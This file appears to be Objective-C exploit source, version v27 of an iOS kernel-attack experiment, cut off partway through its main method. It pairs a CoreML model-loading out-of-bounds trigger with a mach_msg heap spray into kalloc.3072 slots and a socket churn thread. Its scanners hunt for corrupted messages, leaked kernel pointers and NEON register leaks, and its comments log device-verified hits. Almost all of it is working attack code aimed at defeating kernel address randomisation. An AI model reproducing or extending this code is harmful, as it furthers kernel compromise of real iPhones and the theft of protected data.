// P044AksKaslrReach.m
// v27 — v25 engine + port-kind payload diff + fingerprint_scan + guarded control recv.
//
// Ledger (churn-conditioned, device-verified):
//   v20 mixed   -> HIT, HIT
//   v21 tail    -> 0/0/0 (ordering poison)
//   v22 mixed   -> HIT (2045), HIT (2046)
//   v23 tail-8  -> 0s — root-caused: corrupted complex kmsgs are REJECTED by
//     the kernel on recv and our scanner silently dropped them. The signal
//     was being discarded, not absent.
//
// v24 changes:
//   1. scanVictims port-kind branch: recv errors other than timeout/invalid
//      = KERNEL REJECTED CORRUPTED DESCRIPTORS = conversion signal.
//   2. Watcher thread: continuous recv over queued drains for 45s after
//      fire (delayed landings: +27s/+52s/+12min/cross-zone all witnessed).
//   3. Events recorded under a mutex: inline diff, port rejection signal,
//      drain corruption — printed at verdict.
//
// v25 additions (engine body unchanged):
//   A. 96 NEON witnesses (V0..V31 magic, ALU spin). Scan via
//      thread_suspend + thread_get_state(ARM_NEON_STATE64) before fire,
//      t+0, every 5s in the watch window, and at end.
//   B. Control recv of ONE port-kind victim before fire (benign baseline).
//   C. recv_msg_sz: on TOO_LARGE copy msgh_size out. Inline rejections
//      (kind 4) no longer silent. Prediction status logged; if prediction
//      fails, say whether OOB signals are already present.
//
// v27 deltas (engine body unchanged):
//   D1 recv_msg_sz(port,payload,waitMs,corruptSize,expectSize): flag ONLY on
//      msgh_size != expectSize (-> MACH_RCV_TOO_LARGE + *corruptSize).
//      recv_msg stays a thin wrapper (expectSize=0). Call sites typed:
//      scanVictims inline->P044_EXPECT_INLINE, scanVictims port-kind->
//      P044_EXPECT_PORTK, watcher drain->P044_EXPECT_INLINE, controlRecv->
//      P044_EXPECT_PORTK.
//   D2 PORT-KIND PAYLOAD DIFF: on SUCCESS the body word must == 2 and the pad
//      [0x1c, sizeof(port_msg_t)-sizeof(mach_msg_header_t)) must == 0; a HIT
//      fires only on a diff (benign clean = NOT a hit). Non-timeout rejection
//      -> PORT-KIND SIGNAL + hits++. Inline size deviation counts hits +
//      ev_push(4,...).
//   D3 fingerprint_scan helper, invoked on every HIT.
//   D4 P044_CONTROL_RECV=0; PHASE 4f guarded; enabled path picks a mid-array
//      port-kind victim (first i >= PAIR_COUNT/2 with kind==1), real buffer,
//      re-sends after, leaves done=0.
//   D5 prediction FAILED logged EXPECTED; success logged "ok (UNEXPECTED with
//      addchain — check model)"; verdict FLAG only when prediction OK while
//      COREML_MODEL_NAME contains "addchain".
//   D6 model-name guard after findCoreMLModelURL (log, no abort).
//   D7 banner: BUILD v27 + NEON_WITNESS_COUNT / PORT_VICTIM_EVERY /
//      P044_CONTROL_RECV.
// Retained: churn seed, mixed layout + last-8 tail, send_msg / send_port_msg
//   / fill_payload / kptr_scan / hexdump16, drain cleanup, v18 logging.
// recv_msg(port, payload, waitMs) signature and contract unchanged
//   (thin wrapper over recv_msg_sz).
//
// Isolation: one tap per force-quit. PANIC POSSIBLE at fire and at
// port-kind recv (a panic = kernel dereferenced our bytes = evidence).
// No OOL memory descriptors. No syscall 536. NOT hasKread.

#import "P044AksKaslrReach.h"
#import "A14_23F77_LabOffsets.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"

#import <Foundation/Foundation.h>
#import <CoreML/CoreML.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <mach/arm/thread_status.h>
#import <netinet/in.h>
#import <netinet/icmp6.h>
#import <pthread.h>
#import <string.h>
#import <sys/resource.h>
#import <sys/socket.h>
#import <unistd.h>
#import <stdlib.h>

#define P044_BUILD @"p044-coreml-v27-portkind-diff"

#define INPUT_COUNT 254
#define PAYLOAD_SIZE 0xb80
#define PAIR_COUNT 2048
#define DRAIN_COUNT 2048
#define COREML_MODEL_NAME @"XVRC27_254in_1out_addchain"

#define PORT_VICTIM_EVERY 4
#define TAIL_PORTK_COUNT 8
#define CHURN_BATCH 512
#define CHURN_SETTLE_SEC 1.0
#define WATCH_SECONDS 45.0
#define RECV_WAIT_MS_EMPTY 1
#define RECV_WAIT_MS_WORK 1000
#define RECV_WAIT_MS_CTRL 50
#define EVENT_LOG_MAX 32
#define NEON_WITNESS_COUNT 96

#define P044_CONTROL_RECV 0
#define P044_EXPECT_INLINE (sizeof(mach_msg_header_t)+PAYLOAD_SIZE)
#define P044_EXPECT_PORTK sizeof(port_msg_t)

#ifndef ARM_NEON_STATE64
#define ARM_NEON_STATE64 17
#endif

typedef struct {
    mach_port_t hole;
    mach_port_t victim;
    int kind;
    int done;
} pair_t;

typedef struct {
    mach_msg_header_t hdr;
    uint8_t bytes[];
} inline_msg_t;

/* complex msg: hdr 0x18 + body 0x4 + 2 port descs 0x18 + pad -> 0xb74
   kdata = 0xb74 + 0x24 = 0xb98  (P034 band, kalloc.3072) */
typedef struct {
    mach_msg_header_t hdr;
    mach_msg_body_t body;
    mach_msg_port_descriptor_t desc[2];
    uint8_t pad[PAYLOAD_SIZE - 0x40];
} port_msg_t;

typedef struct {
    int kind;                 /* 0 inline-hit 1 port-signal 2 drain-inline 3 drain-signal 4 inline-rejection 5 portkind-hit */
    uint32_t idx;
    kern_return_t kr;
    uint32_t corruptSize;
    uint8_t body[PAYLOAD_SIZE];
} ev_t;

static ev_t g_events[EVENT_LOG_MAX];
static int g_evCount = 0;
static int g_evTotal = 0;
static pthread_mutex_t g_evLock = PTHREAD_MUTEX_INITIALIZER;

static void ev_push(int kind, uint32_t idx, kern_return_t kr, const uint8_t *body,
                    uint32_t corruptSize) {
    pthread_mutex_lock(&g_evLock);
    g_evTotal++;
    if (g_evCount < EVENT_LOG_MAX) {
        ev_t *e = &g_events[g_evCount];
        e->kind = kind;
        e->idx = idx;
        e->kr = kr;
        e->corruptSize = corruptSize;
        if (body) {
            memcpy(e->body, body, PAYLOAD_SIZE);
        } else {
            memset(e->body, 0, PAYLOAD_SIZE);
        }
        g_evCount++;
    }
    pthread_mutex_unlock(&g_evLock);
}

#pragma mark - Logging (v18 contract: whole-buffer rewrite)

static void p044_write_log(NSString *out) {
    NSString *docs = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    NSString *path = [docs stringByAppendingPathComponent:@"p044_aks_kaslr_reach_log.txt"];
    int fd = open(path.fileSystemRepresentation, O_CREAT | O_WRONLY | O_TRUNC, 0644);
    if (fd >= 0) {
        const char *s = out.UTF8String;
        if (s) write(fd, s, strlen(s));
        fcntl(fd, F_FULLFSYNC);
        close(fd);
    }
}

#pragma mark - Payload / port / message helpers

static void fill_payload(uint8_t *p, uint32_t index, uint32_t role) {
    for (size_t i = 0; i < PAYLOAD_SIZE; i++) {
        p[i] = (uint8_t)(0xa5u ^ (uint8_t)(index * 17u) ^
                         (uint8_t)(role * 0x31u) ^ (uint8_t)(i * 13u));
    }
    uint64_t magic = role ? 0x5649435458563237ULL : 0x484f4c4558563237ULL;
    uint64_t marker = 0x4141414141414141ULL;
    uint64_t len = PAYLOAD_SIZE;
    memcpy(p + 0x00, &magic, sizeof(magic));
    memcpy(p + 0x08, &index, sizeof(index));
    memcpy(p + 0x0c, &role, sizeof(role));
    memcpy(p + 0x10, &len, sizeof(len));
    memcpy(p + 0x18, &marker, sizeof(marker));
}

static mach_port_t make_port(void) {
    mach_port_t port = MACH_PORT_NULL;
    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (kr != KERN_SUCCESS) return MACH_PORT_NULL;
    kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    if (kr != KERN_SUCCESS) {
        mach_port_destroy(mach_task_self(), port);
        return MACH_PORT_NULL;
    }
    return port;
}

static void send_msg(mach_port_t port, uint32_t index, uint32_t role) {
    size_t msg_size = sizeof(inline_msg_t) + PAYLOAD_SIZE;
    inline_msg_t *msg = calloc(1, msg_size);
    if (!msg) return;

    msg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
    msg->hdr.msgh_size = (mach_msg_size_t)msg_size;
    msg->hdr.msgh_remote_port = port;
    msg->hdr.msgh_id = (mach_msg_id_t)(0x58560000u | ((role & 0xffu) << 8) | (index & 0xffu));
    fill_payload(msg->bytes, index, role);

    mach_msg(&msg->hdr, MACH_SEND_MSG, (mach_msg_size_t)msg_size, 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
    free(msg);
}

static void send_port_msg(mach_port_t port, mach_port_t rightA, mach_port_t rightB,
                          uint32_t index) {
    size_t msg_size = sizeof(port_msg_t);
    port_msg_t *msg = calloc(1, msg_size);
    if (!msg) return;

    msg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) |
                         MACH_MSGH_BITS_COMPLEX;
    msg->hdr.msgh_size = (mach_msg_size_t)msg_size;
    msg->hdr.msgh_remote_port = port;
    msg->hdr.msgh_id = (mach_msg_id_t)(0x58570000u | (index & 0xffu));
    msg->body.msgh_descriptor_count = 2;
    msg->desc[0].name = rightA;
    msg->desc[0].disposition = MACH_MSG_TYPE_COPY_SEND;
    msg->desc[0].type = MACH_MSG_PORT_DESCRIPTOR;
    msg->desc[1].name = rightB;
    msg->desc[1].disposition = MACH_MSG_TYPE_COPY_SEND;
    msg->desc[1].type = MACH_MSG_PORT_DESCRIPTOR;

    mach_msg(&msg->hdr, MACH_SEND_MSG, (mach_msg_size_t)msg_size, 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
    free(msg);
}

/* v27 D1: flag ONLY when msgh_size != expectSize. expectSize=0 => never flag
   (recv_msg thin-wrapper path). TOO_LARGE captures the kernel-written
   msgh_size into *corruptSize. */
static kern_return_t recv_msg_sz(mach_port_t port, uint8_t *payload, uint32_t waitMs,
                                 uint32_t *corruptSize, mach_msg_size_t expectSize) {
    size_t msg_size = sizeof(inline_msg_t) + PAYLOAD_SIZE + sizeof(mach_msg_max_trailer_t) + 0x100;
    inline_msg_t *msg = calloc(1, msg_size);
    if (!msg) return MACH_MSG_SIZE_MAX;
    if (corruptSize) *corruptSize = 0;

    kern_return_t kr = mach_msg(&msg->hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0,
                                (mach_msg_size_t)msg_size, port, waitMs, MACH_PORT_NULL);
    if (kr == MACH_MSG_SUCCESS) {
        if (expectSize && msg->hdr.msgh_size != expectSize) {
            if (corruptSize) *corruptSize = msg->hdr.msgh_size;
            kr = MACH_RCV_TOO_LARGE;
        } else if (payload) {
            memcpy(payload, msg->bytes, PAYLOAD_SIZE);
        }
    } else if (kr == MACH_RCV_TOO_LARGE) {
        if (corruptSize) *corruptSize = msg->hdr.msgh_size;
    }
    free(msg);
    return kr;
}

static kern_return_t recv_msg(mach_port_t port, uint8_t *payload, uint32_t waitMs) {
    return recv_msg_sz(port, payload, waitMs, NULL, 0);
}

static void hexdump16(uint8_t *buf, size_t start, NSMutableString *out) {
    size_t base = start & ~(size_t)0xf;
    for (size_t off = base; off < base + 0x40 && off < PAYLOAD_SIZE; off += 0x10) {
        [out appendFormat:@"    %04zx:", off];
        for (size_t k = 0; k < 0x10 && off + k < PAYLOAD_SIZE; k++) {
            [out appendFormat:@" %02x", buf[off + k]];
        }
        [out appendString:@"\n"];
    }
}

static void kptr_scan(uint8_t *buf, uint32_t victim, NSMutableString *out) {
    for (size_t j = 0; j + 8 <= PAYLOAD_SIZE; j += 4) {
        uint64_t val = *(uint64_t *)&buf[j];
        if ((uint32_t)(val >> 32) == 0xfffffff0u) {
            [out appendFormat:@"    *** KPTR victim=%u body[0x%zx] = 0x%016llx ***\n",
                victim, j, (unsigned long long)val];
        }
    }
}

/* v27 D3: fingerprint_scan. Scans 16B-stride fingerprint surface
   [u32 surfaceId][u32 0xcN counter][1][1] from `start` (rounded down to a
   4-byte boundary) to end. C2: uses `start` so port-kind callers can skip the
   descriptor region. */
static void fingerprint_scan(uint8_t *buf, size_t start, NSMutableString *out) {
    for (size_t j = (start & ~(size_t)3); j + 16 <= PAYLOAD_SIZE; j += 4) {
        uint32_t counter = *(uint32_t *)&buf[j + 4];
        if (counter >= 0xc0u && counter <= 0xffu &&
            *(uint32_t *)&buf[j + 8] == 1u &&
            *(uint32_t *)&buf[j + 12] == 1u) {
            [out appendFormat:@"    *** FINGERPRINT @0x%zx [u32 surface][u32 0x%x counter][1][1] ***\n",
                j, counter];
        }
    }
}

#pragma mark - NEON witnesses (v25 overlay — not the 3072 engine)

typedef struct {
    uint64_t magic[64] __attribute__((aligned(16)));
    pthread_t th;
    thread_act_t port;
    volatile int ready;
    volatile int quit;
} neon_wit_t;

static neon_wit_t g_witness[NEON_WITNESS_COUNT];

static void *neon_witness_worker(void *arg) {
    neon_wit_t *w = (neon_wit_t *)arg;
    w->ready = 1;
    while (!w->quit) {
        __asm__ volatile(
            "ld1 {v0.2d, v1.2d, v2.2d, v3.2d}, [%0], #64   \n"
            "ld1 {v4.2d, v5.2d, v6.2d, v7.2d}, [%0], #64   \n"
            "ld1 {v8.2d, v9.2d, v10.2d, v11.2d}, [%0], #64 \n"
            "ld1 {v12.2d, v13.2d, v14.2d, v15.2d}, [%0], #64\n"
            "ld1 {v16.2d, v17.2d, v18.2d, v19.2d}, [%0], #64\n"
            "ld1 {v20.2d, v21.2d, v22.2d, v23.2d}, [%0], #64\n"
            "ld1 {v24.2d, v25.2d, v26.2d, v27.2d}, [%0], #64\n"
            "ld1 {v28.2d, v29.2d, v30.2d, v31.2d}, [%0]    \n"
            :
            : "r"(w->magic)
            : "v0","v1","v2","v3","v4","v5","v6","v7",
              "v8","v9","v10","v11","v12","v13","v14","v15",
              "v16","v17","v18","v19","v20","v21","v22","v23",
              "v24","v25","v26","v27","v28","v29","v30","v31", "memory");
        /* pure-ALU spin: NEON stays loaded, no syscall */
        for (volatile int s = 0; s < 64; s++) {
            __asm__ volatile("nop");
        }
    }
    return NULL;
}

#pragma mark - Churn + watcher threads

static volatile int g_churn_go = 0;

static void *churn_worker(void *arg) {
    while (g_churn_go) {
        int fds[CHURN_BATCH];
        for (int i = 0; i < CHURN_BATCH; i++) {
            fds[i] = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
        }
        for (int i = 0; i < CHURN_BATCH; i++) {
            if (fds[i] >= 0) close(fds[i]);
        }
        usleep(1);
    }
    return NULL;
}

/* Watcher: continuous recv over the queued DRAIN array while the delayed
   write is in flight. Inline drain corrupted -> event 2. Port-kind drain
   rejected by the kernel -> event 3. Runs until g_watch_go = 0. */
static mach_port_t *g_watchDrain = NULL;
static uint8_t *g_watchScanned = NULL;
static volatile int g_watch_go = 0;

static void *watch_worker(void *arg) {
    uint8_t expected[PAYLOAD_SIZE];
    uint8_t actual[PAYLOAD_SIZE];
    while (g_watch_go) {
        if (g_watchDrain) {
            for (uint32_t i = 0; i < DRAIN_COUNT; i++) {
                if (!g_watchDrain[i] || g_watchScanned[i]) continue;
                uint32_t corruptSize = 0;
                kern_return_t kr = recv_msg_sz(g_watchDrain[i], actual, 0, &corruptSize,
                                               P044_EXPECT_INLINE);
                if (kr == MACH_MSG_SUCCESS) {
                    g_watchScanned[i] = 1;
                    fill_payload(expected, i, 2);
                    if (memcmp(actual, expected, PAYLOAD_SIZE) != 0) {
                        kptr_scan(actual, i, NULL);
                        ev_push(2, i, kr, actual, 0);
                    }
                } else if (kr != MACH_RCV_TIMED_OUT && kr != MACH_RCV_INVALID_NAME) {
                    g_watchScanned[i] = 1;
                    ev_push(3, i, kr, NULL, corruptSize);
                }
            }
        }
        usleep(0);
    }
    return NULL;
}

#pragma mark - Implementation

@implementation P044AksKaslrReach

+ (NSURL *)findCoreMLModelURL:(NSMutableString *)out {
    [out appendString:@"\n=== PHASE 1: Find CoreML model ===\n"];

    NSBundle *bundle = [NSBundle mainBundle];

    NSURL *compiledURL = [bundle URLForResource:COREML_MODEL_NAME withExtension:@"mlmodelc"];
    if (compiledURL) {
        [out appendFormat:@"  Found compiled model: %@\n", compiledURL.path];
        return compiledURL;
    }

    NSURL *sourceURL = [bundle URLForResource:COREML_MODEL_NAME withExtension:@"mlmodel"];
    if (!sourceURL) {
        NSString *sourcePath = [bundle.resourcePath stringByAppendingPathComponent:
                               [COREML_MODEL_NAME stringByAppendingPathExtension:@"mlmodel"]];
        if ([[NSFileManager defaultManager] fileExistsAtPath:sourcePath]) {
            sourceURL = [NSURL fileURLWithPath:sourcePath];
        }
    }

    if (!sourceURL) {
        [out appendString:@"  STOP: No .mlmodelc or .mlmodel in bundle\n"];
        [out appendFormat:@"  Bundle: %@\n", bundle.bundlePath];
        return nil;
    }

    [out appendFormat:@"  Found source model: %@\n", sourceURL.path];
    NSError *err = nil;
    NSURL *compiled = [MLModel compileModelAtURL:sourceURL error:&err];
    if (!compiled) {
        [out appendFormat:@"  STOP: compile failed: %@\n", err.localizedDescription];
        return nil;
    }
    [out appendFormat:@"  Compiled to: %@\n", compiled.path];
    return compiled;
}

+ (MLModel *)loadCoreMLModel:(NSURL *)modelURL out:(NSMutableString *)out {
    [out appendString:@"\n=== PHASE 2: Load CoreML model ===\n"];

    MLModelConfiguration *configuration = [[MLModelConfiguration alloc] init];
    configuration.computeUnits = MLComputeUnitsAll;

    NSError *err = nil;
    MLModel *model = [MLModel modelWithContentsOfURL:modelURL
                                       configuration:configuration
                                               error:&err];
    if (!model) {
        [out appendFormat:@"  STOP: MLModel load failed: %@\n", err.localizedDescription];
        return nil;
    }

    [out appendString:@"  MLModel loaded successfully\n"];
    return model;
}

+ (MLDictionaryFeatureProvider *)createFeatures:(NSMutableString *)out {
    [out appendFormat:@"\n=== PHASE 3: Create %u input features ===\n", INPUT_COUNT];

    NSMutableDictionary<NSString *, MLFeatureValue *> *features =
        [NSMutableDictionary dictionaryWithCapacity:INPUT_COUNT];
    double expected = 0.0;

    for (uint32_t i = 0; i < INPUT_COUNT; i++) {
        double value = (double)(i + 1);
        NSString *name = [NSString stringWithFormat:@"x_%03u", i];

        NSError *err = nil;
        MLMultiArray *array = [[MLMultiArray alloc] initWithShape:@[@1]
                                                        dataType:MLMultiArrayDataTypeDouble
                                                           error:&err];
        if (!array) {
            [out appendFormat:@"  STOP: MLMultiArray failed for %@: %@\n",
                name, err.localizedDescription];
            return nil;
        }
        array[0] = @(value);
        features[name] = [MLFeatureValue featureValueWithMultiArray:array];
        expected += value;
    }

    [out appendFormat:@"  Created %u features, expected sum=%.0f\n", INPUT_COUNT, expected];

    NSError *err = nil;
    MLDictionaryFeatureProvider *provider =
        [[MLDictionaryFeatureProvider alloc] initWithDictionary:features error:&err];
    if (!provider) {
        [out appendFormat:@"  STOP: FeatureProvider failed: %@\n", err.localizedDescription];
        return nil;
    }

    [out appendString:@"  FeatureProvider created\n"];
    return provider;
}

/* v24 spray: proven mixed layout + last-8 port-kind tail. */
+ (pair_t *)sprayOut:(NSMutableString *)out drain:(mach_port_t **)outDrain {
    [out appendFormat:@"\n=== PHASE 4: Spray mach_msg pairs=%u payload=0x%x (every %u victim = port-kind + last %u port-kind) ===\n",
        PAIR_COUNT, PAYLOAD_SIZE, PORT_VICTIM_EVERY, TAIL_PORTK_COUNT];

    mach_port_t *drain = calloc(DRAIN_COUNT, sizeof(*drain));
    pair_t *pairs = calloc(PAIR_COUNT, sizeof(*pairs));
    if (!drain || !pairs) {
        free(drain);
        free(pairs);
        return NULL;
    }

    int drainOK = 0;
    for (uint32_t i = 0; i < DRAIN_COUNT; i++) {
        drain[i] = make_port();
        if (drain[i]) {
            send_msg(drain[i], i, 2);
            drainOK++;
        }
    }
    [out appendFormat:@"  drain: %d/%u kmsgs queued (late-window sensors)\n", drainOK, DRAIN_COUNT];

    int pairOK = 0, portKind = 0;
    for (uint32_t i = 0; i < PAIR_COUNT; i++) {
        pairs[i].hole = make_port();
        pairs[i].victim = make_port();
        pairs[i].kind = (i >= (PAIR_COUNT - TAIL_PORTK_COUNT) ||
                         (i % PORT_VICTIM_EVERY == 3)) ? 1 : 0;
        pairs[i].done = 0;
        if (pairs[i].hole && pairs[i].victim) {
            send_msg(pairs[i].hole, i, 0);
            if (pairs[i].kind == 1) {
                mach_port_t rightA = make_port();
                mach_port_t rightB = make_port();
                if (rightA && rightB) {
                    send_port_msg(pairs[i].victim, rightA, rightB, i);
                    portKind++;
                }
                if (rightA) mach_port_destroy(mach_task_self(), rightA);
                if (rightB) mach_port_destroy(mach_task_self(), rightB);
            } else {
                send_msg(pairs[i].victim, i, 1);
            }
            pairOK++;
        }
    }
    [out appendFormat:@"  spray: %d/%u pairs (inline=%d portkind=%d)\n",
        pairOK, PAIR_COUNT, pairOK - portKind, portKind];

    [out appendString:@"  Freeing holes to create empty kalloc.3072 slots...\n"];
    for (uint32_t i = 0; i < PAIR_COUNT; i++) {
        if (pairs[i].hole) recv_msg(pairs[i].hole, NULL, RECV_WAIT_MS_WORK);
    }
    sync();

    [out appendString:@"  Spray complete. Holes freed.\n"];
    *outDrain = drain;
    return pairs;
}

/* t+0 victim scan. Inline: success+diff, plus size-deviation rejections.
   Port-kind: BOTH success-with-diff AND non-timeout kernel rejection. */
+ (int)scanVictims:(pair_t *)pairs out:(NSMutableString *)out {
    uint8_t expected[PAYLOAD_SIZE];
    uint8_t actual[PAYLOAD_SIZE];
    int hits = 0;

    for (uint32_t i = 0; i < PAIR_COUNT; i++) {
        if (!pairs[i].victim || pairs[i].done) continue;

        uint32_t corruptSize = 0;
        kern_return_t kr = recv_msg_sz(pairs[i].victim, actual, RECV_WAIT_MS_WORK, &corruptSize,
                                       (pairs[i].kind == 0) ? P044_EXPECT_INLINE : P044_EXPECT_PORTK);

        if (pairs[i].kind == 0) {
            if (kr == MACH_MSG_SUCCESS) {
                pairs[i].done = 1;
                fill_payload(expected, i, 1);
                size_t first = SIZE_MAX;
                size_t changed = 0;
                for (size_t j = 0; j < PAYLOAD_SIZE; j++) {
                    if (actual[j] != expected[j]) {
                        if (first == SIZE_MAX) first = j;
                        changed++;
                    }
                }
                if (first != SIZE_MAX) {
                    hits++;
                    [out appendFormat:@"  HIT inline victim=%u first_diff=0x%zx changed=%zu\n",
                        i, first, changed];
                    hexdump16(actual, first, out);
                    kptr_scan(actual, (uint32_t)i, out);
                    fingerprint_scan(actual, first, out);
                }
            } else if (kr != MACH_RCV_TIMED_OUT && kr != MACH_RCV_INVALID_NAME) {
                pairs[i].done = 1;
                hits++;
                [out appendFormat:
                    @"  *** INLINE-REJECTION victim=%u recv kr=0x%x corrupt_msgh_size=0x%x (expected 0x%x) ***\n",
                    i, kr, corruptSize,
                    (unsigned)(sizeof(mach_msg_header_t) + PAYLOAD_SIZE)];
                ev_push(4, i, kr, NULL, corruptSize);
            }
        } else {
            /* D2 PORT-KIND PAYLOAD DIFF: clean = body word 2 and pad all zero.
               Any diff = kernel rewrote the descriptor area = conversion. */
            if (kr == MACH_MSG_SUCCESS) {
                uint32_t body = 0;
                memcpy(&body, actual, sizeof(body));
                int diff = (body != 2u);
                size_t padEnd = (size_t)(sizeof(port_msg_t) - sizeof(mach_msg_header_t));
                for (size_t j = 0x1c; !diff && j < padEnd; j++) {
                    if (actual[j] != 0) diff = 1;
                }
                if (diff) {
                    pairs[i].done = 1;
                    hits++;
                    [out appendFormat:@"  HIT port-kind victim=%u (payload diff, body=0x%x)\n",
                        i, body];
                    hexdump16(actual, 0, out);
                    kptr_scan(actual, (uint32_t)i, out);
                    fingerprint_scan(actual, 0x1c, out);
                    ev_push(5, i, kr, actual, 0);
                }
                /* benign clean success = NOT a hit; leave for watcher/cleanup */
            } else if (kr != MACH_RCV_TIMED_OUT && kr != MACH_RCV_INVALID_NAME) {
                /* kernel rejected the corrupted complex kmsg = it CONSUMED our bytes */
                pairs[i].done = 1;
                hits++;
                [out appendFormat:
                    @"  *** PORT-KIND SIGNAL victim=%u recv kr=0x%x — KERNEL REJECTED CORRUPTED DESCRIPTORS ***\n",
                    i, kr];
                [out appendFormat:@"      corrupt_msgh_size=0x%x (expected 0x%x)\n",
                    corruptSize, (unsigned)sizeof(port_msg_t)];
                [out appendString:@"      kernel CONSUMED our bytes. This is the conversion event.\n"];
                ev_push(1, i, kr, NULL, corruptSize);
            }
            /* timed out = port empty = normal; leave for the watcher */
        }
    }
    return hits;
}

+ (int)startWitnesses:(NSMutableString *)out {
    int started = 0;
    memset(g_witness, 0, sizeof(g_witness));
    for (int k = 0; k < NEON_WITNESS_COUNT; k++) {
        neon_wit_t *w = &g_witness[k];
        for (int q = 0; q < 64; q++) {
            w->magic[q] = 0x4e45000000000000ULL | ((uint64_t)k << 32) | (uint64_t)q;
        }
        if (pthread_create(&w->th, NULL, neon_witness_worker, w) != 0) {
            w->th = 0;
            continue;
        }
        w->port = pthread_mach_thread_np(w->th);
        started++;
    }
    for (int spin = 0; spin < 500; spin++) {
        int allReady = 1;
        for (int k = 0; k < NEON_WITNESS_COUNT; k++) {
            if (g_witness[k].th && !g_witness[k].ready) {
                allReady = 0;
                break;
            }
        }
        if (allReady) break;
        usleep(1000);
    }
    [out appendFormat:@"  NEON witnesses armed: %d/%d  flavor=%d COUNT=%u sizeof=%zu\n",
        started, NEON_WITNESS_COUNT, ARM_NEON_STATE64,
        (unsigned)ARM_NEON_STATE64_COUNT, sizeof(arm_neon_state64_t)];
    return started;
}

+ (void)stopWitnesses {
    for (int k = 0; k < NEON_WITNESS_COUNT; k++)
        g_witness[k].quit = 1;
    for (int k = 0; k < NEON_WITNESS_COUNT; k++) {
        neon_wit_t *w = &g_witness[k];
        if (w->th) {
            pthread_join(w->th, NULL);
            w->th = 0;
        }
        if (w->port) {
            mach_port_deallocate(mach_task_self(), w->port);
            w->port = MACH_PORT_NULL;
        }
    }
}

+ (int)neon_scan:(NSMutableString *)out tag:(NSString *)tag {
    int mismatches = 0;
    int fingerprints = 0;
    int printed = 0;
    const int printCap = 32;
    for (int k = 0; k < NEON_WITNESS_COUNT; k++) {
        neon_wit_t *w = &g_witness[k];
        if (!w->th || !w->port) continue;
        if (thread_suspend(w->port) != KERN_SUCCESS) continue;
        arm_neon_state64_t st;
        memset(&st, 0, sizeof(st));
        mach_msg_type_number_t cnt = ARM_NEON_STATE64_COUNT;
        kern_return_t kr = thread_get_state(w->port, ARM_NEON_STATE64,
                                            (thread_state_t)&st, &cnt);
        thread_resume(w->port);
        if (kr != KERN_SUCCESS) continue;

        uint64_t *v = (uint64_t *)st.__v;
        for (int q = 0; q < 64; q++) {
            uint64_t cur = v[q];
            uint64_t was = w->magic[q];
            if (cur != was) {
                mismatches++;
                if (printed < printCap) {
                    [out appendFormat:@"  *** NEON-WITNESS HIT wid=%d qword=%d val=0x%016llx (was 0x%016llx) ***\n",
                        k, q, (unsigned long long)cur, (unsigned long long)was];
                    printed++;
                }
            }
            uint32_t hi = (uint32_t)(cur >> 32);
            if (hi >= 0x000000c0u && hi <= 0x000000ffu) {
                fingerprints++;
                if (printed < printCap) {
                    [out appendFormat:@"  *** NEON-FINGERPRINT wid=%d qword=%d val=0x%016llx (0xcN counter) ***\n",
                        k, q, (unsigned long long)cur];
                    printed++;
                }
            }
            if (q + 1 < 64 &&
                hi >= 0x000000c0u && hi <= 0x000000ffu &&
                v[q + 1] == 0x0000000100000001ULL) {
                if (printed < printCap) {
                    [out appendFormat:@"  *** NEON-FILL-STRIDE wid=%d qword=%d val=0x%016llx nxt=0x%016llx (16B fill fingerprint) ***\n",
                        k, q, (unsigned long long)cur, (unsigned long long)v[q + 1]];
                    printed++;
                }
            }
        }
    }
    [out appendFormat:@"  NEON-WITNESS[%@]: baseline_mismatch=%d fingerprint=%d printed=%d/%d\n",
        tag, mismatches, fingerprints, printed, printCap];
    return mismatches + fingerprints;
}

+ (void)controlRecv:(pair_t *)pairs out:(NSMutableString *)out {
    (void)pairs;
    (void)out;
#if P044_CONTROL_RECV
    for (uint32_t i = (PAIR_COUNT / 2); i < PAIR_COUNT; i++) {
        if (pairs[i].victim && !pairs[i].done && pairs[i].kind == 1) {
            uint8_t actual[PAYLOAD_SIZE];
            uint32_t corruptSize = 0;
            kern_return_t kr = recv_msg_sz(pairs[i].victim, actual, RECV_WAIT_MS_CTRL,
                                           &corruptSize, P044_EXPECT_PORTK);
            if (kr == MACH_MSG_SUCCESS) {
                [out appendFormat:@"  CONTROL port-kind victim=%u kr=0x%x (SUCCESS; pre-fire port-kind recv is benign)\n",
                    i, kr];
            } else if (kr == MACH_RCV_TOO_LARGE) {
                [out appendFormat:@"  CONTROL port-kind victim=%u kr=0x%x (TOO_LARGE here is benign; corrupt_msgh_size=0x%x)\n",
                    i, kr, corruptSize];
            } else {
                [out appendFormat:@"  CONTROL port-kind victim=%u kr=0x%x (unexpected) corrupt_msgh_size=0x%x\n",
                    i, kr, corruptSize];
            }
            /* re-send so the pre-fire baseline does not consume the victim */
            mach_port_t rA = make_port();
            mach_port_t rB = make_port();
            if (rA && rB) {
                send_port_msg(pairs[i].victim, rA, rB, i);
                [out appendFormat:@"  CONTROL: re-queued port-kind victim=%u for fire\n", i];
            }
            if (rA) mach_port_destroy(mach_task_self(), rA);
            if (rB) mach_port_destroy(mach_task_self(), rB);
            pairs[i].done = 0;
            return;
        }
    }
    [out appendString:@"  CONTROL: no mid-array port-kind victim found\n"];
#else
    (void)pairs;
    [out appendString:@"  CONTROL: disabled (P044_CONTROL_RECV=0)\n"];
#endif
}

+ (NSString *)tap {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"=== p044 session %@ BUILD %@ ===\n",
        LabLocalMilitaryNow(), P044_BUILD];
    [out appendString:@"CoreML API approach + mach_msg spray.\n"];
    [out appendString:@"Uses .mlmodelc bundle. 254 inputs -> CheckandPrewire OOB.\n"];
